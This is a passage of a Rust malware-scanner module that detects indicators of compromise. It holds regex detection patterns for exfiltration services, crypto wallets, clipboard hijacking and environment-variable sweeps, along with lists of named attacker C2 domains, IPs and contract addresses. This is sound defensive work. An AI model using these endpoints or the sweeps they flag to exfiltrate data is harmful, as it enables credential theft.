//! IOC (Indicator of Compromise) detection engine.
//!
//! Extracts and classifies network and financial indicators across all text
//! files: URLs, raw IPv4 C2 addresses, suspicious-TLD domains, known exfil
//! endpoints (Discord webhooks, Telegram bots, pastebin, interactsh, ngrok,
//! …), cryptocurrency wallet addresses (BTC/ETH/LTC/XMR/TRON), clipboard-
//! hijack wallet-replacement patterns, ICP blockchain canister C2 endpoints,
//! and named attacker infrastructure from the IOC-01..IOC-12 KB entries.
//!
//! Severity is elevated when an indicator appears in an install script or near
//! environment enumeration (Object.keys/values/entries on process.env) — a
//! signal for full-environment sweeps, NOT for ordinary process.env.VAR reads.

use std::sync::OnceLock;

use regex::Regex;
use tracing::trace;

use crate::engine::{DetectionEngine, FileKind, FileUnit, ScanContext};
use crate::types::{Confidence, FileLocation, Finding, Severity, ThreatCategory};

// ---------------------------------------------------------------------------
// Regex helpers — compiled once
// ---------------------------------------------------------------------------

/// One compiled set of all patterns used by IocEngine. Built lazily once.
struct Patterns {
    // Generic URL (http/https/ftp/ws/wss).
    url: Regex,
    // Raw public IPv4 literal (excludes RFC-1918/loopback/link-local).
    ipv4_public: Regex,
    // Domain with a suspicious TLD (bare or as part of a URL host).
    suspicious_tld: Regex,
    // Known exfil service endpoints.
    exfil_endpoint: Regex,
    // BTC base58 (1… or 3…), 25-34 chars.
    btc_base58: Regex,
    // BTC bech32 (bc1…).
    btc_bech32: Regex,
    // Ethereum / EVM address (0x + 40 hex).
    eth_addr: Regex,
    // Litecoin (L… or M…), 26-34 chars.
    ltc_addr: Regex,
    // Monero — starts with 4, 95 chars, base58 alphabet.
    xmr_addr: Regex,
    // TRON — starts with T, 34 chars, base58 alphabet.
    tron_addr: Regex,
    // Clipboard-hijack pattern: clipboard read (including pyperclip) near a
    // wallet-like string.  (?s) is required so .{0,400} crosses newlines.
    clipboard_hijack: Regex,
    // Environment enumeration — Object.keys/values/entries(process.env) or
    // JSON.stringify(process.env).  This is a full-sweep signal distinct from
    // a plain process.env.FOO read.
    env_enumeration: Regex,
    // Tells us an install-script context (lifecycle script names).
    install_script_path: Regex,

    // -----------------------------------------------------------------------
    // IOC-01..IOC-12: named attacker infrastructure
    // -----------------------------------------------------------------------

    // IOC-01: ICP blockchain canister gateway pattern (CanisterWorm / CanisterSprawl).
    icp_canister: Regex,
    // IOC-02: Known campaign-specific webhook.site UUIDs.
    webhook_site_worm: Regex,
    // IOC-03: SANDWORM_MODE / Mini Shai-Hulud specific domains.
    sandworm_domains: Regex,
    // IOC-04: CanisterWorm Trivy typosquat domains.
    canisterworm_domains: Regex,
    // IOC-05: Hardcoded Telegram bot tokens / SMTP mailtrap credentials.
    hardcoded_smtp_telegram: Regex,
    // IOC-06: BunnyCDN exfil subdomains (Great npm Heist).
    bunnycdn_exfil: Regex,
    // IOC-07: Scavenger RAT C2 domains.
    scavenger_rat_c2: Regex,
    // IOC-08: Lazarus BeaverTail C2 IPs and fake-telemetry endpoint.
    lazarus_beavertail: Regex,
    // IOC-09: Covert analytics pixel exfil (eslint-scope 2018).
    covert_pixel_exfil: Regex,
    // IOC-10: node-ipc 2026 DNS C2 (azurestaticprovider.net + HMAC key literal).
    node_ipc_2026_dns: Regex,
    // IOC-11: CanisterSprawl secondary exfil domain + canister.
    canistersprawl: Regex,
    // IOC-12: Ethereum contract C2 (287-package typosquat wave).
    eth_contract_c2: Regex,
}

impl Patterns {
    fn build() -> Self {
        // NOTE: every `.expect()` here is on a hardcoded literal; a bad literal
        // is a programmer error verified at test time, not a runtime condition.
        Self {
            url: Regex::new(r"(?i)\b(https?|ftp|wss?)://[^\s\x22'<>()\[\]\\,;]{4,256}")
                .expect("invariant: url regex"),

            // Four dotted octets — broad match; private/loopback/link-local
            // ranges and boundary violations are filtered in Rust after the
            // match (regex 1.x does not support look-around assertions).
            ipv4_public: Regex::new(r"\b(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})\b")
                .expect("invariant: ipv4 regex"),

            suspicious_tld: Regex::new(
                r"(?i)\b[a-z0-9](?:[a-z0-9\-]{0,61}[a-z0-9])?\.(?:xyz|top|tk|ru|su|cc|gq|cf|ga|ml|pw|icu|live|online|site|click|link|win|bid|racing|review|stream|download|zip|app|dev)\b",
            )
            .expect("invariant: suspicious tld regex"),

            exfil_endpoint: Regex::new(
                r"(?i)(?:discordapp\.com/api/webhooks|discord\.com/api/webhooks|api\.telegram\.org/bot[0-9]{6,12}:[A-Za-z0-9_\-]{30,}|pastebin\.com/raw/[A-Za-z0-9]+|hastebin\.com/[A-Za-z0-9]+|requestbin\.(?:com|net|io)/[A-Za-z0-9]+|webhook\.site/[0-9a-f\-]{36}|ngrok\.io/[^\s\x22'<>]{1,80}|pipedream\.net|beeceptor\.com|[a-z0-9\-]+\.burpcollaborator\.net|oast\.(?:pro|fun|live|site|online|me)|interactsh\.com|canarytokens\.com/[^\s\x22'<>]{1,80}|hookbin\.com/[A-Za-z0-9]+)",
            )
            .expect("invariant: exfil endpoint regex"),

            btc_base58: Regex::new(r"\b[13][1-9A-HJ-NP-Za-km-z]{24,33}\b")
                .expect("invariant: btc base58 regex"),

            btc_bech32: Regex::new(r"\bbc1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{6,87}\b")
                .expect("invariant: btc bech32 regex"),

            eth_addr: Regex::new(r"\b0x[0-9a-fA-F]{40}\b").expect("invariant: eth addr regex"),

            ltc_addr: Regex::new(r"\b[LM][1-9A-HJ-NP-Za-km-z]{25,33}\b")
                .expect("invariant: ltc addr regex"),

            xmr_addr: Regex::new(r"\b4[0-9A-Za-z]{94}\b").expect("invariant: xmr addr regex"),

            tron_addr: Regex::new(r"\bT[1-9A-HJ-NP-Za-km-z]{33}\b")
                .expect("invariant: tron addr regex"),

            // Clipboard read including pyperclip.paste/pyperclip.copy with a
            // wallet-like string in close proximity (same line or within ~400
            // chars across lines).  (?s) crosses newline boundaries.
            // Two alternations so the wallet can appear either AFTER or BEFORE
            // the clipboard call (the pyperclip pattern assigns the wallet to a
            // variable before using it in the pyperclip.copy() call).
            clipboard_hijack: Regex::new(
                r"(?si)(?:(?:clipboard|readText|writeText|ClipboardData|getData\s*\(\s*[\x22']text|pyperclip\.(?:paste|copy)).{0,400}?[13bc1][1-9A-HJ-NP-Za-km-z0-9]{20,}|[13bc1][1-9A-HJ-NP-Za-km-z0-9]{20,}.{0,400}?pyperclip\.(?:paste|copy))",
            )
            .expect("invariant: clipboard hijack regex"),

            // Elevation flag: full environment enumeration (Object.keys/values/entries
            // or JSON.stringify applied to process.env), not a plain property read.
            // This distinguishes "sweep all vars for secrets" from "read one SDK key".
            env_enumeration: Regex::new(
                r"(?i)(?:Object\.(?:keys|values|entries)|JSON\.stringify)\s*\(\s*process\.env\s*\)",
            )
            .expect("invariant: env enumeration regex"),

            install_script_path: Regex::new(
                r"(?i)(?:/|\\)(?:install|postinstall|preinstall|binding\.gyp|scripts/install)\b",
            )
            .expect("invariant: install script path regex"),

            // -----------------------------------------------------------------------
            // IOC-01: ICP blockchain canister gateways.
            // Pattern: any URL whose host ends in .icp0.io or .ic0.app
            // -----------------------------------------------------------------------
            icp_canister: Regex::new(r"(?i)\b[a-z0-9\-]+\.(?:icp0\.io|ic0\.app)\b")
                .expect("invariant: icp canister regex"),

            // IOC-02: Specific high-confidence worm webhook.site UUIDs.
            webhook_site_worm: Regex::new(
                r"(?i)webhook\.site/(?:bb8ca5f6-4175-45d2-b042-fc9ebb8170b7|602a4c72-7033-4e28-92ea-dc66e59206e5)",
            )
            .expect("invariant: webhook_site_worm regex"),

            // IOC-03: SANDWORM_MODE / Mini Shai-Hulud C2 and DNS exfil domains.
            sandworm_domains: Regex::new(
                r"(?i)(?:t\.m-kosche\.com|official334\.workers\.dev|freefan\.net|fanfree\.net)",
            )
            .expect("invariant: sandworm_domains regex"),

            // IOC-04: CanisterWorm infrastructure (typosquat aquasecurity + PAT exfil).
            canisterworm_domains: Regex::new(
                r"(?i)(?:scan\.aquasecurtiy\.org|hackmoltrepeat\.com|plug-tab-protective-relay\.trycloudflare\.com)",
            )
            .expect("invariant: canisterworm_domains regex"),

            // IOC-05: Hardcoded Telegram bot tokens (long form) or mailtrap SMTP.
            // The exfil_endpoint pattern already catches short bot URLs; this catches
            // the token credential string itself (8-12 digit ID : 35-char secret).
            hardcoded_smtp_telegram: Regex::new(
                r"(?i)(?:api\.telegram\.org/bot[0-9]{8,12}:[A-Za-z0-9_\-]{35,}|sandbox\.smtp\.mailtrap\.io)",
            )
            .expect("invariant: hardcoded_smtp_telegram regex"),

            // IOC-06: BunnyCDN exfil subdomains used by Great npm Heist.
            bunnycdn_exfil: Regex::new(
                r"(?i)(?:static-mw-host\.b-cdn\.net|img-data-backup\.b-cdn\.net)",
            )
            .expect("invariant: bunnycdn_exfil regex"),

            // IOC-07: Scavenger RAT C2 domains (eslint-config-prettier backdoor).
            scavenger_rat_c2: Regex::new(
                r"(?i)(?:datahog\.su|datacrab-analytics\.com|datalytica\.su|dieorsuffer\.com|firebase\.su|smartscreen-api\.com)",
            )
            .expect("invariant: scavenger_rat_c2 regex"),

            // IOC-08: Lazarus BeaverTail — known C2 IPs + fake telemetry endpoint.
            // Raw IPs are also caught by ipv4_public; this rule fires at Critical
            // specifically for the known Lazarus cluster.
            lazarus_beavertail: Regex::new(
                r"(?i)(?:172\.86\.84\.38|95\.164\.17\.24|185\.235\.241\.208|process-log\.vercel\.app/api/ipcheck)",
            )
            .expect("invariant: lazarus_beavertail regex"),

            // IOC-09: Analytics pixel exfil (eslint-scope 2018 — Referer header abuse).
            covert_pixel_exfil: Regex::new(
                r"(?i)(?:sstatic1\.histats\.com|c\.statcounter\.com)",
            )
            .expect("invariant: covert_pixel_exfil regex"),

            // IOC-10: node-ipc 2026 DNS C2 — domain + HMAC key literal + env var marker.
            node_ipc_2026_dns: Regex::new(
                r#"(?i)(?:azurestaticprovider\.net|qZ8pL3vNxR9wKmTyHbVcFgDsJaEoUi|__ntw\s*=\s*["']?1)"#,
            )
            .expect("invariant: node_ipc_2026_dns regex"),

            // IOC-11: CanisterSprawl — secondary exfil domain and known canister URL.
            canistersprawl: Regex::new(
                r"(?i)(?:telemetry\.api-monitor\.com|cjn37-uyaaa-aaaac-qgnva-cai\.raw\.icp0\.io)",
            )
            .expect("invariant: canistersprawl regex"),

            // IOC-12: Ethereum contract C2 (287-package wave) — specific contract
            // address or the secondary parameter address.
            eth_contract_c2: Regex::new(
                r"(?i)(?:0xa1b40044EBc2794f207D45143Bd82a1B86156c6b|0x52221c293a21D8CA7AFD01Ac6bFAC7175D590A84)",
            )
            .expect("invariant: eth_contract_c2 regex"),
        }
    }
}

static PATTERNS: OnceLock<Patterns> = OnceLock::new();

#[inline]
fn patterns() -> &'static Patterns {
    PATTERNS.get_or_init(Patterns::build)
}

// ---------------------------------------------------------------------------
// Context flags — derived per-file
// ---------------------------------------------------------------------------

struct FileCtx {
    /// File appears to be an install/lifecycle script (path-based).
    is_install_script: bool,
    /// File contains full environment enumeration (Object.keys/values/entries
    /// or JSON.stringify applied to process.env).  Raises exfil severity.
    /// A plain `process.env.API_KEY` read does NOT set this flag.
    has_env_enumeration: bool,
}

impl FileCtx {
    fn from_file(f: &FileUnit) -> Self {
        let p = patterns();
        let path = &f.rel_path;
        let is_install_script = p.install_script_path.is_match(path)
            || path.ends_with("binding.gyp")
            || path.contains("install.js")
            || path.contains("postinstall");
        // Only look for env enumeration in text files under 4 MiB.
        let has_env_enumeration = f.looks_textual()
            && f.data.len() <= 4 * 1024 * 1024
            && p.env_enumeration.is_match(&f.text_lossy());
        Self {
            is_install_script,
            has_env_enumeration,
        }
    }
}

// ---------------------------------------------------------------------------
// Dedup helper
// ---------------------------------------------------------------------------

/// A canonical key for deduplication within a single file.
#[derive(PartialEq, Eq, Hash)]
struct IocKey {
    rule_id: &'static str,
    /// Lowercased matched value — dedup is case-insensitive.
    value: String,
}

// ---------------------------------------------------------------------------
// IocEngine
// ---------------------------------------------------------------------------

/// Maximum findings emitted per file, preventing report flooding for files
/// that are e.g. IP allow-lists or wallet-address dumps.
const MAX_FINDINGS_PER_FILE: usize = 40;

/// The IOC detection engine.
///
/// Scans all text files for network and financial indicators and classifies
/// them by context.  All regex patterns are compiled once at first use via
/// [`OnceLock`].
pub struct IocEngine;

impl Default for IocEngine {
    fn default() -> Self {
        Self
    }
}

impl IocEngine {
    fn scan_file(&self, file: &FileUnit, out: &mut Vec<Finding>) {
        if !file.looks_textual() {
            return;
        }
        // Cap input size so adversarially huge text files don't DoS the engine.
        // A HEAD+TAIL window (not a head-only truncation) is used so a payload
        // padded past the head window is still scanned (pad-before-payload).
        const MAX_SCAN_BYTES: usize = 8 * 1024 * 1024;
        let window = crate::engine::scan_window(file.text_lossy(), MAX_SCAN_BYTES);
        let text: &str = &window;

        let fctx = FileCtx::from_file(file);
        let p = patterns();

        let mut local: Vec<Finding> = Vec::new();
        let mut seen: std::collections::HashSet<IocKey> = std::collections::HashSet::new();

        // Emit a finding if this (rule_id, lowercased-value) pair hasn't been
        // seen yet and we haven't hit the per-file cap.
        macro_rules! emit_deduped {
            ($rule_id:expr, $value:expr, $finding:expr) => {{
                let key = IocKey {
                    rule_id: $rule_id,
                    value: $value.to_lowercase(),
                };
                if seen.insert(key) && local.len() < MAX_FINDINGS_PER_FILE {
                    local.push($finding);
                }
            }};
        }

        // Elevation: fires when the file is an install script OR contains a
        // full environment enumeration sweep.
        let elevate = fctx.is_install_script || fctx.has_env_enumeration;

        // ------------------------------------------------------------------
        // 0. Named attacker infrastructure (IOC-01..IOC-12) — always Critical
        //    or High regardless of file context.
        // ------------------------------------------------------------------

        // IOC-01: ICP blockchain canister endpoints (CanisterWorm / CanisterSprawl).
        for mat in p.icp_canister.find_iter(text) {
            let matched = mat.as_str();
            let line = line_of(text, mat.start());
            emit_deduped!(
                "IOC_ICP_CANISTER",
                matched,
                Finding::new(
                    "ioc",
                    ThreatCategory::Network,
                    Severity::Critical,
                    Confidence::High,
                    "ICP blockchain canister C2 endpoint",
                    "A reference to an Internet Computer Protocol (ICP) canister gateway \
(*.icp0.io / *.ic0.app) was found. These endpoints are censorship-resistant: \
no domain takedown is possible. Used by CanisterWorm and CanisterSprawl as C2.",
                )
                .with_rule_id("IOC_ICP_CANISTER")
                .with_location(FileLocation::at_line(file.rel_path.clone(), line))
                .with_evidence(matched, 160)
            );
        }

        // IOC-02: Specific high-confidence worm webhook.site UUIDs.
        for mat in p.webhook_site_worm.find_iter(text) {
            let matched = mat.as_str();
            let line = line_of(text, mat.start());
            emit_deduped!(
                "IOC_WEBHOOK_SITE_WORM",
                matched,
                Finding::new(
                    "ioc",
                    ThreatCategory::Exfiltration,
                    Severity::Critical,
                    Confidence::High,
                    "Known worm exfil webhook.site UUID",
                    "A webhook.site UUID previously attributed to the Shai-Hulud v1, \
s1ngularity, or Ectoplasm worm campaigns was found. This specific endpoint was \
used as a shared exfiltration sink across multiple supply-chain attacks.",
                )
                .with_rule_id("IOC_WEBHOOK_SITE_WORM")
                .with_location(FileLocation::at_line(file.rel_path.clone(), line))
                .with_evidence(matched, 160)
            );
        }

        // IOC-03: SANDWORM_MODE / Mini Shai-Hulud domains.
        for mat in p.sandworm_domains.find_iter(text) {
            let matched = mat.as_str();
            let line = line_of(text, mat.start());
            emit_deduped!(
                "IOC_SANDWORM_DOMAINS",
                matched,
                Finding::new(
                    "ioc",
                    ThreatCategory::Network,
                    Severity::Critical,
                    Confidence::High,
                    "SANDWORM_MODE / Mini Shai-Hulud C2 domain",
                    "A domain associated with the SANDWORM_MODE or Mini Shai-Hulud worm \
campaign was found. These domains serve as C2, DNS-tunneling exfil channels, or \
fake OTEL collectors used to exfiltrate developer credentials.",
                )
                .with_rule_id("IOC_SANDWORM_DOMAINS")
                .with_location(FileLocation::at_line(file.rel_path.clone(), line))
                .with_evidence(matched, 160)
            );
        }

        // IOC-04: CanisterWorm Trivy typosquat domains.
        for mat in p.canisterworm_domains.find_iter(text) {
            let matched = mat.as_str();
            let line = line_of(text, mat.start());
            emit_deduped!(
                "IOC_CANISTERWORM_DOMAINS",
                matched,
                Finding::new(
                    "ioc",
                    ThreatCategory::Network,
                    Severity::Critical,
                    Confidence::High,
                    "CanisterWorm infrastructure domain",
                    "A domain associated with the CanisterWorm campaign was found. \
`scan.aquasecurtiy.org` is a typosquat of the legitimate Aqua Security scanner \
used to deliver the CanisterWorm Trivy payload; `hackmoltrepeat.com` is a PAT \
exfil endpoint.",
                )
                .with_rule_id("IOC_CANISTERWORM_DOMAINS")
                .with_location(FileLocation::at_line(file.rel_path.clone(), line))
                .with_evidence(matched, 160)
            );
        }

        // IOC-05: Hardcoded Telegram bot tokens / mailtrap SMTP.
        for mat in p.hardcoded_smtp_telegram.find_iter(text) {
            let matched = mat.as_str();
            let line = line_of(text, mat.start());
            emit_deduped!(
                "IOC_HARDCODED_SMTP_TELEGRAM",
                matched,
                Finding::new(
                    "ioc",
                    ThreatCategory::Exfiltration,
                    Severity::High,
                    Confidence::High,
                    "Hardcoded Telegram bot token or SMTP exfil credential",
                    "A hardcoded Telegram bot token (long-form) or Mailtrap SMTP address \
was found. In supply-chain packages these are always attacker-controlled exfil \
channels: used by Flashbots typosquats, SeedSweep, WhiteSnake, and W4SP.",
                )
                .with_rule_id("IOC_HARDCODED_SMTP_TELEGRAM")
                .with_location(FileLocation::at_line(file.rel_path.clone(), line))
                .with_evidence(matched, 160)
            );
        }

        // IOC-06: BunnyCDN exfil subdomains (Great npm Heist).
        for mat in p.bunnycdn_exfil.find_iter(text) {
            let matched = mat.as_str();
            let line = line_of(text, mat.start());
            emit_deduped!(
                "IOC_BUNNYCDN_EXFIL",
                matched,
                Finding::new(
                    "ioc",
                    ThreatCategory::Exfiltration,
                    Severity::High,
                    Confidence::High,
                    "BunnyCDN exfil subdomain (Great npm Heist)",
                    "A BunnyCDN subdomain attributed to the Great npm Heist campaign \
(2B+ weekly download impact) was found. These subdomains were used to exfiltrate \
harvested credentials and wallet data.",
                )
                .with_rule_id("IOC_BUNNYCDN_EXFIL")
                .with_location(FileLocation::at_line(file.rel_path.clone(), line))
                .with_evidence(matched, 160)
            );
        }

        // IOC-07: Scavenger RAT C2 domains (eslint-config-prettier backdoor).
        for mat in p.scavenger_rat_c2.find_iter(text) {
            let matched = mat.as_str();
            let line = line_of(text, mat.start());
            emit_deduped!(
                "IOC_SCAVENGER_RAT_C2",
                matched,
                Finding::new(
                    "ioc",
                    ThreatCategory::Network,
                    Severity::Critical,
                    Confidence::High,
                    "Scavenger RAT C2 domain",
                    "A domain attributed to the Scavenger RAT infrastructure was found \
(eslint-config-prettier backdoor, CVE-2025-54313). These domains serve as C2 \
and exfil endpoints for the RAT payload.",
                )
                .with_rule_id("IOC_SCAVENGER_RAT_C2")
                .with_location(FileLocation::at_line(file.rel_path.clone(), line))
                .with_evidence(matched, 160)
            );
        }

        // IOC-08: Lazarus BeaverTail C2 IPs and fake telemetry endpoint.
        for mat in p.lazarus_beavertail.find_iter(text) {
            let matched = mat.as_str();
            let line = line_of(text, mat.start());
            emit_deduped!(
                "IOC_LAZARUS_BEAVERTAIL",
                matched,
                Finding::new(
                    "ioc",
                    ThreatCategory::Network,
                    Severity::Critical,
                    Confidence::High,
                    "Lazarus BeaverTail C2 indicator",
                    "A raw IP address or domain attributed to the Lazarus Group \
BeaverTail campaign (North Korean APT, 338+ npm packages, Contagious Interview) \
was found. This infrastructure is used for credential and wallet exfiltration.",
                )
                .with_rule_id("IOC_LAZARUS_BEAVERTAIL")
                .with_location(FileLocation::at_line(file.rel_path.clone(), line))
                .with_evidence(matched, 160)
            );
        }

        // IOC-09: Analytics pixel exfil — eslint-scope 2018.
        for mat in p.covert_pixel_exfil.find_iter(text) {
            let matched = mat.as_str();
            let line = line_of(text, mat.start());
            emit_deduped!(
                "IOC_COVERT_PIXEL_EXFIL",
                matched,
                Finding::new(
                    "ioc",
                    ThreatCategory::Exfiltration,
                    Severity::High,
                    Confidence::High,
                    "Covert analytics pixel exfil endpoint",
                    "A domain associated with covert analytics pixel exfiltration was \
found (eslint-scope 2018). The attack embedded stolen npm tokens in the HTTP \
Referer header of fake analytics beacon requests.",
                )
                .with_rule_id("IOC_COVERT_PIXEL_EXFIL")
                .with_location(FileLocation::at_line(file.rel_path.clone(), line))
                .with_evidence(matched, 160)
            );
        }

        // IOC-10: node-ipc 2026 DNS C2 infrastructure.
        for mat in p.node_ipc_2026_dns.find_iter(text) {
            let matched = mat.as_str();
            let line = line_of(text, mat.start());
            emit_deduped!(
                "IOC_NODE_IPC_2026_DNS",
                matched,
                Finding::new(
                    "ioc",
                    ThreatCategory::Network,
                    Severity::Critical,
                    Confidence::High,
                    "node-ipc 2026 DNS C2 indicator",
                    "An indicator from the node-ipc 2026 DNS-tunneling credential stealer \
was found: either the C2 domain `azurestaticprovider.net`, the hardcoded HMAC \
key used to authenticate DNS beacons, or the anti-re-execution env var `__ntw`.",
                )
                .with_rule_id("IOC_NODE_IPC_2026_DNS")
                .with_location(FileLocation::at_line(file.rel_path.clone(), line))
                .with_evidence(matched, 160)
            );
        }

        // IOC-11: CanisterSprawl secondary exfil and canister endpoint.
        for mat in p.canistersprawl.find_iter(text) {
            let matched = mat.as_str();
            let line = line_of(text, mat.start());
            emit_deduped!(
                "IOC_CANISTERSPRAWL",
                matched,
                Finding::new(
                    "ioc",
                    ThreatCategory::Network,
                    Severity::Critical,
                    Confidence::High,
                    "CanisterSprawl exfil endpoint",
                    "An exfil endpoint from the CanisterSprawl campaign was found: the \
first cross-ecosystem npm to PyPI worm. Either the secondary exfil domain \
`telemetry.api-monitor.com` or the specific ICP canister URL were matched.",
                )
                .with_rule_id("IOC_CANISTERSPRAWL")
                .with_location(FileLocation::at_line(file.rel_path.clone(), line))
                .with_evidence(matched, 160)
            );
        }

        // IOC-12: Ethereum contract C2 addresses (287-package typosquat wave).
        for mat in p.eth_contract_c2.find_iter(text) {
            let matched = mat.as_str();
            let line = line_of(text, mat.start());
            emit_deduped!(
                "IOC_ETH_CONTRACT_C2",
                matched,
                Finding::new(
                    "ioc",
                    ThreatCategory::Network,
                    Severity::Critical,
                    Confidence::High,
                    "Ethereum contract C2 address (287-package wave)",
                    "A specific Ethereum contract address used as C2 by the 287-package \
typosquat wave was found. The contract serves configuration and commands to \
installed payloads via Infura/Alchemy RPC calls.",
                )
                .with_rule_id("IOC_ETH_CONTRACT_C2")
                .with_location(FileLocation::at_line(file.rel_path.clone(), line))
                .with_evidence(matched, 160)
            );
        }

        // ------------------------------------------------------------------
        // 1. Known exfil endpoints — always High Exfiltration
        // ------------------------------------------------------------------
        for mat in p.exfil_endpoint.find_iter(text) {
            let matched = mat.as_str();
            let line = line_of(text, mat.start());
            emit_deduped!(
                "IOC_EXFIL_ENDPOINT",
                matched,
                Finding::new(
                    "ioc",
                    ThreatCategory::Exfiltration,
                    Severity::High,
                    Confidence::High,
                    "Known exfiltration endpoint",
                    "Hardcoded reference to a known data-exfiltration service \
(Discord webhook, Telegram bot, pastebin, interactsh, ngrok, etc.).",
                )
                .with_rule_id("IOC_EXFIL_ENDPOINT")
                .with_location(FileLocation::at_line(file.rel_path.clone(), line))
                .with_evidence(matched, 160)
            );
        }

        // ------------------------------------------------------------------
        // 2. Cryptocurrency wallet addresses — High CryptoStealer
        // ------------------------------------------------------------------

        // BTC base58 (legacy P2PKH / P2SH)
        for mat in p.btc_base58.find_iter(text) {
            let matched = mat.as_str();
            // Require at least 26 chars to avoid short base58 tokens.
            if matched.len() < 26 {
                continue;
            }
            let line = line_of(text, mat.start());
            emit_deduped!(
                "IOC_WALLET_BTC",
                matched,
                Finding::new(
                    "ioc",
                    ThreatCategory::CryptoStealer,
                    Severity::High,
                    Confidence::Medium,
                    "Bitcoin wallet address (base58)",
                    "A Bitcoin legacy or P2SH wallet address is hardcoded. \
In a package this indicates a crypto-stealer or ransom dropper.",
                )
                .with_rule_id("IOC_WALLET_BTC")
                .with_location(FileLocation::at_line(file.rel_path.clone(), line))
                .with_evidence(matched, 160)
            );
        }

        // BTC bech32 (native SegWit / Taproot)
        for mat in p.btc_bech32.find_iter(text) {
            let matched = mat.as_str();
            let line = line_of(text, mat.start());
            emit_deduped!(
                "IOC_WALLET_BTC_BECH32",
                matched,
                Finding::new(
                    "ioc",
                    ThreatCategory::CryptoStealer,
                    Severity::High,
                    Confidence::High,
                    "Bitcoin wallet address (bech32/SegWit)",
                    "A Bitcoin native-SegWit or Taproot address is hardcoded. \
In a package this indicates a crypto-stealer or ransom dropper.",
                )
                .with_rule_id("IOC_WALLET_BTC_BECH32")
                .with_location(FileLocation::at_line(file.rel_path.clone(), line))
                .with_evidence(matched, 160)
            );
        }

        // Ethereum / EVM
        for mat in p.eth_addr.find_iter(text) {
            let matched = mat.as_str();
            // Exclude the all-zeros burn address and trivial test values.
            if matched.to_lowercase() == "0x0000000000000000000000000000000000000000" {
                continue;
            }
            let line = line_of(text, mat.start());
            emit_deduped!(
                "IOC_WALLET_ETH",
                matched,
                Finding::new(
                    "ioc",
                    ThreatCategory::CryptoStealer,
                    Severity::High,
                    Confidence::High,
                    "Ethereum/EVM wallet address",
                    "A 20-byte hex EVM address is hardcoded. In a package context \
this is a strong indicator of a crypto-stealer or address-substitution attack.",
                )
                .with_rule_id("IOC_WALLET_ETH")
                .with_location(FileLocation::at_line(file.rel_path.clone(), line))
                .with_evidence(matched, 160)
            );
        }

        // Litecoin
        for mat in p.ltc_addr.find_iter(text) {
            let matched = mat.as_str();
            if matched.len() < 26 {
                continue;
            }
            let line = line_of(text, mat.start());
            emit_deduped!(
                "IOC_WALLET_LTC",
                matched,
                Finding::new(
                    "ioc",
                    ThreatCategory::CryptoStealer,
                    Severity::High,
                    Confidence::Medium,
                    "Litecoin wallet address",
                    "A Litecoin wallet address is hardcoded in source. \
Possible crypto-stealer or ransom dropper.",
                )
                .with_rule_id("IOC_WALLET_LTC")
                .with_location(FileLocation::at_line(file.rel_path.clone(), line))
                .with_evidence(matched, 160)
            );
        }

        // Monero
        for mat in p.xmr_addr.find_iter(text) {
            let matched = mat.as_str();
            let line = line_of(text, mat.start());
            emit_deduped!(
                "IOC_WALLET_XMR",
                matched,
                Finding::new(
                    "ioc",
                    ThreatCategory::CryptoStealer,
                    Severity::High,
                    Confidence::Medium,
                    "Monero wallet address",
                    "A Monero wallet address (95 chars, starts with 4) is hardcoded. \
Monero is widely used in malware for ransom and mining payloads.",
                )
                .with_rule_id("IOC_WALLET_XMR")
                .with_location(FileLocation::at_line(file.rel_path.clone(), line))
                .with_evidence(matched, 160)
            );
        }

        // TRON (TRC20)
        for mat in p.tron_addr.find_iter(text) {
            let matched = mat.as_str();
            // TRON addresses are exactly 34 chars.
            if matched.len() != 34 {
                continue;
            }
            let line = line_of(text, mat.start());
            emit_deduped!(
                "IOC_WALLET_TRON",
                matched,
                Finding::new(
                    "ioc",
                    ThreatCategory::CryptoStealer,
                    Severity::High,
                    Confidence::Medium,
                    "TRON wallet address",
                    "A TRON (TRC20) wallet address is hardcoded. Found in drainer \
and clipboard-hijack malware targeting USDT/USDC.",
                )
                .with_rule_id("IOC_WALLET_TRON")
                .with_location(FileLocation::at_line(file.rel_path.clone(), line))
                .with_evidence(matched, 160)
            );
        }

        // Clipboard-hijack wallet replacement (includes pyperclip — GAP-C)
        for mat in p.clipboard_hijack.find_iter(text) {
            let matched = mat.as_str();
            let line = line_of(text, mat.start());
            emit_deduped!(
                "IOC_CLIPBOARD_HIJACK",
                matched,
                Finding::new(
                    "ioc",
                    ThreatCategory::CryptoStealer,
                    Severity::Critical,
                    Confidence::High,
                    "Clipboard wallet-hijack pattern",
                    "Code reads clipboard content (or uses pyperclip.paste/copy) and \
replaces it with a hardcoded wallet address: a defining pattern of \
clipboard-hijacking crypto-stealers.",
                )
                .with_rule_id("IOC_CLIPBOARD_HIJACK")
                .with_location(FileLocation::at_line(file.rel_path.clone(), line))
                .with_evidence(matched, 160)
            );
        }

        // ------------------------------------------------------------------
        // 3. Raw public IPv4 literals — Medium/High Network (context-elevated)
        //
        // The regex matches any four-octet dotted address; we filter private,
        // loopback, and link-local ranges here because regex 1.x does not
        // support look-around assertions.
        // ------------------------------------------------------------------
        for caps in p.ipv4_public.captures_iter(text) {
            // caps[0] is the full match; caps[1..4] are the four octets.
            let matched = caps.get(0).map(|m| m.as_str()).unwrap_or("");
            let offset = caps.get(0).map(|m| m.start()).unwrap_or(0);

            // Parse octets — skip malformed (shouldn't happen with the regex).
            let o: Option<[u8; 4]> = (|| {
                let a: u8 = caps.get(1)?.as_str().parse().ok()?;
                let b: u8 = caps.get(2)?.as_str().parse().ok()?;
                let c: u8 = caps.get(3)?.as_str().parse().ok()?;
                let d: u8 = caps.get(4)?.as_str().parse().ok()?;
                Some([a, b, c, d])
            })();
            let [a, b, _c, _d] = match o {
                Some(v) => v,
                None => continue,
            };

            // Skip non-routable / private / loopback / link-local ranges.
            let is_private = a == 10
                || a == 127
                || (a == 169 && b == 254)
                || (a == 172 && (16..=31).contains(&b))
                || (a == 192 && b == 168)
                || a == 0 // 0.0.0.0/8
                || a >= 224; // multicast + reserved (224–255)
            if is_private {
                continue;
            }

            let line = line_of(text, offset);
            let (sev, conf, title, desc) = if elevate {
                (
                    Severity::High,
                    Confidence::High,
                    "Raw IP address in install/credential context",
                    "A raw public IPv4 literal appears in an install script or near \
credential access. Raw IPs in install scripts avoid DNS-based detection and \
are a strong C2 indicator.",
                )
            } else {
                (
                    Severity::Medium,
                    Confidence::Medium,
                    "Hardcoded public IP address",
                    "A raw public IPv4 address is hardcoded. In a package, \
hardcoded IPs often point to C2 infrastructure.",
                )
            };
            emit_deduped!(
